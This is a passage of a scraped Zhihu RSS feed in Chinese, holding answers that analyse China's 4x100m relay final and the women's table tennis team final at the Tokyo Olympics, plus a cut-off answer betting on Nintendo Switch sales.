data-rawwidth=\"1656\" data-rawheight=\"656\" data-watermark=\"watermark\" data-original-src=\"v2-2e702ed1f0628514393a7200b2a488cf\" data-watermark-src=\"v2-6c7690b425761c5d28e1aca802f1f203\" data-private-watermark-src=\"v2-38ae798a7e3ae668d3a91093f2ddb3f4\"></p>\n<p><br></p>\n<h2>决赛：再次第四，追平国家纪录！</h2>\n<p>中国第七道。</p>\n<p>第七道是不错的道次，两边一个是接力老牌强队英国，一个是今年让人刮目相看的意大利（横空出世，确实很多人都没想到）。小日本最外道。</p>\n<p>汤星强、谢震业、苏炳添、吴智强，四人出场的亮相是小悟空爆气的动作。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a3ae3c0efb10e325d01dcd7752e6f366_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"600\" data-rawheight=\"337\" data-watermark=\"watermark\" data-original-src=\"v2-a3ae3c0efb10e325d01dcd7752e6f366\" data-watermark-src=\"v2-c287f38bb92511f344319424efa2211f\" data-private-watermark-src=\"v2-e203a5710cd66aaa1765cae0c42d199f\"></p>\n<p><br></p>\n<p>比赛开始。</p>\n<p>汤星强0.153秒起跑反应，位列第5。从起跑到加速这一段相比其它选手没有什么优势（毕竟决赛第一道就没弱的），不过<b>在完成加速-进入最高速度时，维持极速相当不错。交接棒之前缩小了一些和洛伦佐（意大利）的差距</b>；</p>\n<p>第二棒给到谢震业后，小谢的过渡也是相当顺利的。而老对手日本队，可能过于兴奋/紧张，居然掉棒了……</p>\n<p>第三棒的苏炳添，自然是最强的 （<a href=\"https://www.zhihu.com/question/296458587/answer/508135456\" class=\"internal\">为什么苏炳添4*100米跑第三棒弯道？</a> ）。<b>苏炳添在英国队的外道，和同是老将的理查德·基尔蒂直接PK，死死咬住，几乎抹平了差距</b>；</p>\n<p>最后一棒吴智强是<b>惋惜后的惊喜</b>。</p>\n<p><b>吴智强的启动有点儿可惜，交接棒的启动节奏早了……甚至可能感觉出苏炳添的一丝懊恼。本来3-4棒交接这段，中国完全有可能追平英国、微超意大利。</b></p>\n<p><b>但这种可惜很快又变成一种惊喜，吴智强死死的压住了奥布利克·塞维尔（20岁的小将，百米尚未跑进10秒），将这种微弱领先保持住了。</b></p>\n<p><br></p>\n<p>意大利（菲利帕）和英国（米切尔·布莱克）的冲刺相当优秀，也决定了最终的名次。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-c5750d9ab6f2272b179d722d21640b83_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-c5750d9ab6f2272b179d722d21640b83\" data-watermark-src=\"v2-08d0a57bd0340d6037f1d3ef29548f4a\" data-private-watermark-src=\"v2-fddd1be1a64a00a596372a2249cb2419\"></p>\n<p><br></p>\n<p><b>汤星强起跑足够出色、谢震业顺利过渡、苏炳添疯狂的追赶、吴智强有小失误不过后面全程力压牙买加——37秒79，追平国家纪录</b>（2019年多哈世锦赛，苏炳添/许周政/吴智强/谢震业）！</p>\n<p>与上一届里约奥运会一样，还是<b>决赛第四</b>——甚至跑赢了牙买加（0.05秒）！</p>\n<p>只落后铜牌加拿大0.09秒，加拿大的个体实力很高，交接棒技术只能算一般。而交接棒技术一直是世界最佳的日本和牙买加，今天却纷纷表现的非常业余。</p>\n<p><br></p>\n<p>中国队的表现，则真的相当出色。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d722048f4604475aef1050167d39e5bc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-d722048f4604475aef1050167d39e5bc\" data-watermark-src=\"v2-7aeffd36c220ae50780d0d19b348b859\" data-private-watermark-src=\"v2-5753474e589fdf5b0db175f5aa766aa9\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c5750d9ab6f2272b179d722d21640b83_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-c5750d9ab6f2272b179d722d21640b83\" data-watermark-src=\"v2-08d0a57bd0340d6037f1d3ef29548f4a\" data-private-watermark-src=\"v2-fddd1be1a64a00a596372a2249cb2419\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-24b15adc47f6843c25336f7f79d3671f_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1366\" data-watermark=\"watermark\" data-original-src=\"v2-24b15adc47f6843c25336f7f79d3671f\" data-watermark-src=\"v2-49c4619611736d0b0343eaa0480c1741\" data-private-watermark-src=\"v2-d7b09e5140b397722702f5877c6bf862\"></p>\n<h2>\n<br>中国短跑接力队的昨天、今天和明天</h2>\n<p>太远古时期不提。<b>近年中国短跑和短跑接力兴起，也就是11、12年左右的事，正好十年前苏炳添、张培萌这一代起来。</b></p>\n<p>中国田径队前总教练冯树勇几年前说过一段话，大意是<b>中国接力队此前从上到下都“干劲不足”，大家抱着“人人弱则团体更弱”的心态。结果隔壁日本起了好榜样，4个百米都没破过十的选手，接力队却能和欧美扳手腕，于是从近邻身上得到信心，才有了后面几年可圈可点的成绩。</b></p>\n<p><br></p>\n<p>感兴趣可以看看这个回答，提到不少以前几支接力队：</p>\n<a href=\"https://www.zhihu.com/question/296458587/answer/508135456\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-0d638eaf077707b53a0867e157bc41fd_bh.jpg\" data-image-width=\"2252\" data-image-height=\"836\" class=\"internal\">4x100米接力，为什么苏炳添会跑第三棒弯道？</a><p><br></p>\n<p>2016年，苏炳添接受采访时曾提到这样一句话，“<b>希望中国能多出几个百米跑到10秒20的年轻选手，这样中国接力队才能继续保持竞争力。</b>”当时铁打的最后一棒张培萌已近退役，苏炳添自己也快30。</p>\n<p>2015年北京世锦赛拿到银牌后，很多人就已经担心那支中国接力队已达到上限、很怕后继无人。</p>\n<p>然而这两年中国短跑很神奇的涌现出一大批很值得期待的年轻人。比如“00后”的<b>陈冠锋</b>（10秒06）、<b>何宇鸿</b>（10秒18）、<b>黄永炼</b>（10秒31）、<b>严海滨</b>（10秒22），以及禤达军、王智弘、陈程、李文杰……</p>\n<p><br></p>\n<p>其中比如严海滨，是2003年出生的小将，今年东京奥运会已经是接力队的替补了（这小伙100和200米都有很强竞争力）。还有今年屡次刷新个人最快的陈冠锋、去年刷新34年历史全国青年百米纪录的何宇鸿，<b>不少都已经比苏炳添们同龄时期表现的更为出色</b>。</p>\n<p>后生可畏。</p>\n<p>记住这些年轻的名字吧。</p>\n<p><b>兴许以他们的年龄和实力，在东京奥运会周期还无法挑大梁，不过明年的亚运会和世锦赛、包括三年后的巴黎奥运会，他们兴许就能慢慢接过苏炳添的旗帜。</b></p>\n<p>毕竟届时苏神已经35岁了。</p>\n<p>再加上梁劲生等依然还在当打年的“老将”（很可惜，今年4月底梁劲生拉伤，不然东京很有可能看到他），<b>中国接力队未来几年完全具备成为世界强队的可能。</b></p>\n<p><br></p>\n<p>至于这个上限是多少，比较现实的，</p>\n<ul>\n<li>稳定发挥确保进入决赛、赢下与老对手日本队「亚洲一哥」的较量、冲击前五甚至领奖台的名次；</li>\n<li>用交接棒的技术默契度弥补个体上的差异，用完善的青少年田径梯队人才去抗衡日本卡塔尔等存在的归化/混血军团（比如日本之前的萨尼·布朗）；</li>\n<li>也别像美国、特立尼达和多巴哥们一样，经常动不动交接棒环节拉胯、用低级失误白白浪费天赋；</li>\n</ul>\n<p><br></p>\n<p>另外最近20年，牙买加、美国、英国等接力强队都在药物问题上出现过问题，有隔了快十年成绩被作废、奖牌回收的黑历史——干干净净的跑，干干净净的赢。起码现在看，中国短跑国家队在这点上做得挺不错的。</p>\n<p><br></p>\n<p>继续加油，中国接力队！</p>\n<p>（通篇提的都是中国短跑接力男队，后面有时间再说说女队，同样是好样的）</p>\n<p><img src=\"https://pic3.zhimg.com/v2-90a3e13851db76792d718804d9adee7f_720w.jpg?rss\" data-caption=\"最后一棒吴智强有遗憾有惊喜\" data-size=\"normal\" data-rawwidth=\"728\" data-rawheight=\"408\" data-watermark=\"watermark\" data-original-src=\"v2-90a3e13851db76792d718804d9adee7f\" data-watermark-src=\"v2-7d486b756e0ad33bd077e2037ebb5f47\" data-private-watermark-src=\"v2-c48799b733b3417771b12b432ba9b796\"></p>\n<hr>\n<p>东京奥运会期间，相关的赛事资讯都会在知乎想法中发布，感谢关注<a href=\"https://www.zhihu.com/org/yun-dong-fen-zi-cheng-lan-wen-hua\" class=\"internal\">运动分子</a></p>\n<hr>\n<ul>\n<li><a href=\"https://www.zhihu.com/question/476493978/answer/2032949449\" class=\"internal\">2020 东京奥运跳水女子 3 米跳板决赛施廷懋、王涵包揽冠亚军，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476149568/answer/2029677017\" class=\"internal\">2020 东京奥运田径男子 10000 米埃塞俄比亚选手巴雷加夺得田径首金，如何评价本场比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/476000617/answer/2028599848\" class=\"internal\">如何评价 2020 东京奥运会游泳男子 200 米个人混合泳决赛汪顺夺金？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474850082/answer/2026108063\" class=\"internal\">奥运射击选手是如何看清靶子的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/474575633/answer/2024002780\" class=\"internal\">为什么一些国家的奥运乒乓球选手是华人？</a></li>\n<li><a href=\"https://www.zhihu.com/question/50191573/answer/1953518631\" class=\"internal\">为什么中国运动员运动寿命短？</a></li>\n<li><a href=\"https://www.zhihu.com/question/344468000/answer/1854947316\" class=\"internal\">新中国体育史上，有哪些比赛的瞬间令你沸腾？</a></li>\n<li><a href=\"https://www.zhihu.com/question/373511126/answer/1608008791\" class=\"internal\">举重运动员有多牛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/341661943/answer/1452491051\" class=\"internal\">撑杆跳这项运动的意义是什么，是如何发明的？</a></li>\n<li><a href=\"https://www.zhihu.com/question/293545938/answer/489299124\" class=\"internal\">一个身体素质普通的人被车拉着能达到博尔特的速度吗？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39665045/answer/275431053\" class=\"internal\">历史上有哪些精心布局却被对方一下破局的故事？</a></li>\n<li><a href=\"https://www.zhihu.com/question/20403477/answer/712635036\" class=\"internal\">110 米栏的顶级运动员，为什么他们不参加100米的比赛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/302684797/answer/544389984\" class=\"internal\">男生100m跑到11s很奇怪嘛？</a></li>\n<li><a href=\"https://www.zhihu.com/question/282601379/answer/528371413\" class=\"internal\">跑150米然后截取速度最快的连续100米区间作为100米的成绩是否更合理？</a></li>\n<li><a href=\"https://www.zhihu.com/question/352385663/answer/884879335\" class=\"internal\">为什么马拉松选手最后不冲刺？</a></li>\n<li><a href=\"https://www.zhihu.com/question/39239070/answer/594491009\" class=\"internal\">体育赛事中有哪些「几乎不可破」的纪录？</a></li>\n<li><a href=\"https://www.zhihu.com/question/24987243/answer/1357448925\" class=\"internal\">跑5公里需要多少分钟？</a></li>\n<li><a href=\"https://www.zhihu.com/question/407047274/answer/1363793504\" class=\"internal\">很多退役的军人都说自己五公里可以15/16分，军队的训练真的这么强么？</a></li>\n</ul>\n<p></p>\n<p></p>\n<p></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yun-dong-fen-zi-cheng-lan-wen-hua?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">运动分子</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/477844835/answer/2043691123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">360 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/476382083?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运田径女子组100米决赛？</a><br><a href=\"http://www.zhihu.com/question/476457735?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价 2020 东京奥运会女子 4x100 米混合泳接力决赛中国队获第 4 ？</a><br>\n","link":"http://www.zhihu.com/question/477844835/answer/2043691123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"2020 东京奥运乒乓球女团中国 3:0 完胜日本夺冠，如何评价本场比赛？","date":"2021-08-05 12:52:48","description":"\n<p><b>恭喜中国队3比0战胜日本！</b></p>\n<p>本届奥运会，中日女子选手仅在女单半决赛上交锋一次，即为经典的孙颖莎伊藤之战：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/answer/2026457583\" class=\"internal\">叶子盛：2020 东京奥运会乒乓球女单半决赛孙颖莎 4:0 轻取伊藤美诚，如何评价本场比赛？</a><p>中方的陈梦、孙颖莎、王曼昱三位大将，对日本大姐大伊藤的胜率均是极高的。孙颖莎更是刚刚4比0取胜，对于队友的士气是极大鼓舞。平野虽曾17年表现极其亮眼，但自从被国乒研究后，反手长下旋被盯死，后来一直便没有特别出色的战绩。然而，这是日本的主场，且国乒被其研究了许久。伊藤和平野的打法比较看状态，要防止爆发的可能。这次终于在决赛上相遇，尚有不小的悬念。希望中国队可以迅速取胜，消除任何小概率事件发生的土壤。</p>\n<hr>\n<h2>第一场 双打</h2>\n<p>第一场双打，陈梦/王曼昱对战石川/平野。伊藤留作生力军打单打了。日方上来几回合内就锁了个两个直线，对中国队的习惯、跑位是有较深的研究的。日方选手一个左手一个右手，相比中国两个右手还是有一定跑位优势。</p>\n<p>石川打得很凶，能反拉就反拉，能近台加力快带就快带。局初段我方不太适应，速度有点跟不上，再加上日本有两个运气球，比分到了局中有点落后。日本的配合、线路目前而言要比我方强上一些。</p>\n<p>第一局中后段，日方吃了两个发球。再加上我方抡出了几个质量，实力球还是比日方功底深厚，比分一度扳至八平。然而，日方的线路优势再次发挥作用，连续的正手锁直线，把中方攻得有些措手不及。之后虽我方追上一分，但其后仍被逼到远台，尝试反攻失分。</p>\n<p>我方第一局打得还是有点拘谨，起板的落点也没拉开。这样被对方一左一右调动得太被动，质量优势就显现不出来了。看看第二局换发球接发球轮以后会不会有改观，中国队也需要适应对手的时间。</p>\n<p>偶数局上来似乎中国队明显要舒服一些，平野的综合实力相比石川还是差些，中方能给出更多质量来。虽然石川0比4落后时有一个精彩的侧身爆冲，但并不能挽回下风的气势。见形势大比分落后，再加上本轮次日方限制线路的打法不奏效，接发球也出了不少问题，日本队全部搏杀（且成功率不高，因为不是计划内的战术），速败。关键还是要看第三局，现在的气势我方占优。</p>\n<p>平野的发球我们还是吃了一点的，在下一个轮次尤其要注意。不过王曼昱主要是拧拉为主，吃发球的几率不大，但是回球的落点一定要多想想。陈梦的质量也一定要出得来。</p>\n<p>第三局开始。日本基本的战术还是先锁直线/平野挑大斜线，锁住中国队的正手位，随后再调动回反手位。如此一来，由于中国队是双右手组合，就很容易挤压在一起。王曼昱接发的拧拉还是基本回在对方中路上，如果能多些变化就更好了。</p>\n<p>2比4时是中国队的好球，石川的打法还是比较拼，积极用正手时反手位露出了空当。可以多考虑从这里做文章。5比6时的那球也非常好，一定不能像前面几回合那样送中路，多给点反手，多给点重复落点。对面虽是一左一右，但武器库都不完善，想要拼中国队都需要舍近求远，还是有机会能挤压住对方空间的。</p>\n<p>七平时的回合中国队落点给得非常好，多板对拉后拿下很长气势，本可以成为关键节点，但随后日本就是一个运气球得分。笔者仍感到微微担忧，前途未卜。好在国乒二位在八平后又来了一个对拉得分，打得超出了石川的能力范围，随后一鼓作气拿下本局。</p>\n<p>第三局实在是太关键了…好在中国队成功咬了下来。接下来一定要乘胜追击拿下。有个比较有趣的事在于，陈王二位发球前的沟通，是不是应该稍微小声点…石川和平野应该都能听懂（</p>\n<p>第四局第一个回合平野的反手上手就开始加质量，石川也增强了搏杀力度。中国队有所失误，但力量占据优势，双方战至小分3比3仍是僵持状态。日方的短球还是有所欠缺的，力量也不占优，3比5落后之后叫了暂停。暂停结束后，日方挑打失误，随后又被中国队抢先上手，比分拉开了不小。本局日方的多数得分点还是在控制我方的正手上，又是连续两个锁直线送我们正手的得分了。</p>\n<p>日本5比8落后时，石川反手反拉的完美落点得分，把日本队的气势又带出来了。随后是石川的抢攻套路得分，目前中日仅一分之差。王曼昱的反手在此时发挥了极大作用，力量大，速度快，最后更是一板拧拉一击致命，抢下了第一场双打。</p>\n<p>这场双打对我们太珍贵了。孙颖莎对伊藤并非必胜，日本这次的冲击力是很大的。中国队开了个好头。</p>\n<hr>\n<h2>第二场 孙颖莎 vs 伊藤</h2>\n<p>孙颖莎再战伊藤，刺激。</p>\n<p>第一局以生胶的慢热，孙颖莎是需要拿下的。开局领先，伊藤反手还没什么球，侧剌之类的很少上台，正手也有失误。但孙颖莎还是吃了发球的，这一点需要注意。</p>\n<p>先不论输赢，有一点是中国队的进步，也是信心的提升，那就是孙颖莎完全不怕接发球劈长后与伊藤对反手了。伊藤也明白这一点，在局中段积极求变，反而多去送孙颖莎的正手及中路偏正手。孙颖莎反倒不太舒服，尤其是六平那一球，生胶球送到这个位置的轨迹孙颖莎不太适应。</p>\n<p>有点在跟着伊藤的节奏走。孙颖莎还是要再把节奏放慢点，质量要出得来。比如7比8的那球就很好，多等一个点，质量再提高一点。今天伊藤的打法有所变化，没有完全扑在台子上，孙颖莎也要适时进行调整。</p>\n<p>非常好，孙颖莎的节奏慢下来了。伊藤站在偏中台的位置，不再以快取胜，而是节奏变化加上颗粒的怪。但孙颖莎只要盯住了把质量加上去，哪怕稍微慢一点，也是不怕伊藤拍弧圈的。事实上，伊藤目前为止的打法就不是近台拍。果然采取更合理的战术后，孙颖莎连下四分，夺下第一局。</p>\n<p>第二局似乎伊藤打算变招了，回到老战术，速度极快。不论哪种打法，伊藤都是有相当大的威胁的。孙颖莎如果质量出得来，打得还是非常顺手，但伊藤的起板盯住孙颖莎的反手大斜线以及中路偏正手，还是有点难受。双方拉锯至五平。</p>\n<p>伊藤与孙颖莎进入持续反手相持，孙颖莎的反手状态不错，摩擦感觉很好，持续把颗粒回的下沉球挂住，并寻隙加力至伊藤反手大角得分。伊藤对自己的反手不太自信，心态受到了影响，发球失误。教练赶紧叫暂停。</p>\n<p>居然还把伊藤发球失误做成慢动作回放hhh这个编导有点腹黑（</p>\n<p>暂停结束，孙颖莎反手质量依旧可圈可点，前三板的计算也比伊藤更精良，起板快，线路好，发球伊藤也还没掌握规律。孙颖莎迅速拿下第二局，形势很不错。</p>\n<p>伊藤从单打半决赛开始就吃孙颖莎的中路发球，现在还吃，日本队这届教练不行啊…</p>\n<p>第三局第一回合，伊藤的线路无可挑剔。但就像马龙对樊振东的决赛，樊振东的线路很好，但马龙就是更胜一筹。孙颖莎的线路显得更加刁钻，气势极盛。不过紧接着吃了个不转发球，士气受了影响，后面又吃了一个。</p>\n<p>前两局里孙颖莎严格意义上来说，也有些吃发球，但只要劈到了底线，倒也不怕伊藤起板相持。这局的几个吃发球不同，要么出界，要么台内冒得老高，就完全没有周旋的余地了。伊藤这局的正反手状态均非常好，零失误。8比2领先时更是上演了一个瞎拍神球。不知孙颖莎是会复现半决赛第二局的逆转，还是会战略性先放掉一局。</p>\n<p>孙颖莎这局没什么出手的机会，伊藤的状态开始出来了，值得警惕。孙颖莎吃伊藤的不转吃了非常多个，笔者粗略数数就起码有三个。还是要咬住，质量要加上去。线路也要多想想，接发球送反手太多了也容易被算住。</p>\n<p>第四局孙颖莎上来有点小宇宙爆发的意思了，质量非常高，伊藤几乎没有还手之力。后面伴随着孙颖莎的两个运气球、伊藤的机会球失误、孙颖莎的完美接发，比分迅速拉开，孙颖莎7比2领先。但接下来伊藤扳回一分，告诉孙颖莎自己相持的状态仍在。孙颖莎再次劈长擦边，又是一个运气球，伊藤已经哭笑不得了。</p>\n<p>孙颖莎得理不饶人，正反手全力施为，力量拉满，穿直线、反手爆拉侧切，直接把伊藤的花样全部破掉，11比3取得胜利，中国队大分2比0领先日本。</p>\n<p>本场比赛，伊藤第一二局的战术变化可圈可点，给孙颖莎造成了一定的不适应。团体五局三胜，节奏快，易爆冷，孙颖莎输了一局是有较大压力的。好在孙颖莎顶住压力，后半盘更是顺风拿下，奥运赛场连续两次战胜伊藤，基本已锁定了24巴黎的单打名额。</p>\n<hr>\n<h2>第三场 王曼昱 vs 平野</h2>\n<p>本次奥运国乒启用p卡，换王曼昱上场。固然有刘诗雯伤病缘故，自然也有培养新生代之意。王曼昱实力自然比平野强不少，尤其自17年国乒对平野深入研究后。笔者记得那时平野和国乒多人都碰过了，大家都拿一个打法打她——送反手、中路长，不管是发球还是接发劈长，但她就是摆脱不了（</p>\n<p>开局平野速度很快，这也是她的特长。王曼昱作为实力占优的一方，千万不要跟着以快打快，否则动作不到位，高速相持中就容易下网失误。王曼昱身高臂长，一定要把速度慢下来，质量加上去。王曼昱也确实是这么做的，很顺利就拿下第一局。</p>\n<p>第二局王曼昱上来就全面占优，逼日本叫了暂停。这个暂停叫得好，把王曼昱火热的状态叫没了。一个台内轻挑直线，一个反手起板，一个扑在近台的摆速得分，平野扳回局势。中间王曼昱的劈长思路还是对的，但那球旋转还没加上去，没送到平野的弱点上。王曼昱还是要多加旋转上去，要劈长就剁下去，要上手就像双打最后几球一样，把质量都打出来，平野的速度就被限制了。比如王曼昱4比7落后的那个劈长，做得就比前半段的好。</p>\n<p>看来这个劈长是王曼昱想明白后状态回暖的关键点，王曼昱一路追分至七平，但在八平后还是被平野套路了一个线路，到关键球了。下一回合虽然勉力撑住得分，但还是很被动，让人心惊肉跳。</p>\n<p>九平，王曼昱手握两个发球。平野的正手落点到了正手小三角，速度位置都近乎完美。但王曼昱拥有力量优势，身高臂长，护台极广，硬是直接步法到位快带回来。平野扛不住质量，回防出现机会，被王曼昱穿直线直接得分。这一球太精彩了，平野打到那个落点估计认为自己已经有了。这一分拿下，基本这局已经很上风。果然王曼昱紧接着在相持中稳住，而平野急于拉穿失分，王曼昱逆转第二局！</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fed11cb3ea4723a3a5ace3d3a0db6472_720w.jpg?rss\" data-rawwidth=\"2000\" data-rawheight=\"1117\" data-size=\"normal\" data-caption=\"图源：咪咕直播截图\" data-watermark=\"watermark\" data-original-src=\"v2-fed11cb3ea4723a3a5ace3d3a0db6472\" data-watermark-src=\"v2-ecb2460cc3694270fdc17a0915001329\" data-private-watermark-src=\"v2-85042454dd61639f45899ce9d1e54054\"></p>\n<p>第三局，王曼昱以雷霆之势登场，一度大比分领先。但随着几个接发的问题以及平野的运气球，气势有所回落，教练及时叫了暂停。暂停结束，王曼昱反手起板质量很高，落点在中路偏正手，非常完美。平野的移动速度似乎体现不出什么优势了。平野开始搏杀，但失误率很高，基本没有得分。最终王曼昱轻松获胜，11比3战胜平野！</p>\n<p>王曼昱在整场比赛中体现了极坚韧的意志，再加上护台优势，很多极被动的球都能扭转得分。到了第三局，平野已经没有什么办法了，只好搏杀，但又没有状态。相信以王曼昱的能力，加上奥运等大赛的磨炼，下个周期一定也会是国乒的中流砥柱。</p>\n<hr>\n<p>还没看够？不妨来看看孙颖莎与伊藤的第一次奥运对决：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/answer/2026457583\" class=\"internal\">叶子盛：2020 东京奥运会乒乓球女单半决赛孙颖莎 4:0 轻取伊藤美诚，如何评价本场比赛？</a><p><br></p>\n<hr>\n<p>奥运赛程众多，多数以文字简评方式进行赏析。笔者创建了一个专栏，目前收录了较为齐全的各场次简评，自忖在全网算做得最有诚意的之一了。见：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/column/c_1404020055374372864\" data-image=\"https://pic3.zhimg.com/v2-52a669542a8699d42a3c5796c7e536e9.jpg\" data-image-width=\"200\" data-image-height=\"200\" class=\"internal\">乒乓赛事简评</a><p>欢迎前去专栏对我付出精力更大的图文作品进行指正。无团队，无盈利，用爱发电。如果喜欢，欢迎关注（含多个编辑推荐等）：</p>\n<a data-draft-node=\"block\" data-draft-type=\"link-card\" href=\"https://www.zhihu.com/column/biqinzhai\" data-image=\"https://pic4.zhimg.com/v2-cde3d62e8270146ee8593adcb47189c4.jpg\" data-image-width=\"183\" data-image-height=\"183\" class=\"internal\">避秦斋</a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/macaoleaf?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">叶子盛</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/477548190/answer/2041170193?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">508 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/475772055?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2020 东京奥运会乒乓球女单半决赛孙颖莎 4:0 轻取伊藤美诚，如何评价本场比赛？</a><br><a href=\"http://www.zhihu.com/question/475485375?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2020 东京奥运乒乓球女单 1/4 决赛石川佳纯 1:4 不敌对手出局，如何评价本场比赛？</a><br>\n","link":"http://www.zhihu.com/question/477548190/answer/2041170193?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"SWITCH销量会破亿吗？","date":"2021-08-05 11:30:08","description":"\n<p>不可能破亿的。</p>\n<p><br></p>\n<p>能过5000万就了不起了。</p>\n<p><br></p>\n<p>我觉得是过不了5000万这条线的，要是过了的话，每过100万我在这个回答里更新一个任天堂游戏人物的画像。</p>\n<hr>\n<p>愿赌服输。</p>\n<p><br></p>\n<p>5100万突破的马里奥</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7e97c47a40b703e0f1619b32dfcd7a49_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"800\" data-watermark=\"original\" data-original-src=\"v2-7e97c47a40b703e0f1619b32dfcd7a49\" data-watermark-src=\"v2-5b759cb4c8462090ad284ec0dba96d8b\" data-private-watermark-src=\"v2-6ef7711f8a8da088164c62db56a4c2c0\"></p>\n<p>5200万突破的碧琪公主</p>\n<p><img src=\"https://pic4.zhimg.com/v2-b4941391c25fa167c5f5269be2c3ad45_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"800\" data-rawheight=\"800\" data-watermark=\"original\" data-original-src=\"v2-b4941391c25fa167c5f5269be2c3ad45\" data-watermark-src=\"v2-2443f779a45575d6ac0e0fa42ed4a63c\" data-private-watermark-src=\"v2-ee3ae8ac2527c26bb6466b79b892e4e6\"></p>\n<p>财报更新了，目前5577万。</p>\n<p>5300万突破的罗伊·阿夸·库巴</p>\n<p><img src=\"https://pic3.zhimg.com/v2-02cfe45c2d6a5ff805df3180039a6799_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-02cfe45c2d6a5ff805df3180039a6799\" data-watermark-src=\"v2-0cf443a06cedc28ef5e55e9bb3f1218b\" data-private-watermark-src=\"v2-5dee1b4238d232686bdb3e675f8b7b2a\" data-tags=\"politic\"></p>\n<p>5400万突破的初代林克</p>\n<p><img src=\"https://pic4.zhimg.com/v2-1f9c595e2bc4f4e8ec212dbfc1847c31_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-1f9c595e2bc4f4e8ec212dbfc1847c31\" data-watermark-src=\"v2-17cb54ac8696d41ebfe4aed29ee6fe9b\" data-private-watermark-src=\"v2-2dc9b3cb474f37f192c3e56ebc690316\"></p>\n<p>5500万突破的小麦克</p>\n<p><img src=\"https://pic1.zhimg.com/v2-e4a14e1f8a7019850a2e6074fcceefb9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"720\" data-rawheight=\"720\" data-watermark=\"original\" data-original-src=\"v2-e4a14e1f8a7019850a2e6074fcceefb9\" data-watermark-src=\"v2-93d3c9cdbd6be2e7f438db7cd9b5a9d2\" data-private-watermark-src=\"v2-0d12380b8963c5ad3de55277cd57eb8b\"></p>\n<p> 任天堂新财报出炉，硬件销量累计6144万台。</p>\n<p>5600万突破的《打鸭子》里的狗。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-34800cf72d395278192a449fdab15fb4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1000\" data-rawheight=\"1000\" data-watermark=\"original\" data-original-src=\"v2-34800cf72d395278192a449fdab15fb4\" data-watermark-src=\"v2-7d1c6cc6d39d2c640437781627e23906\" 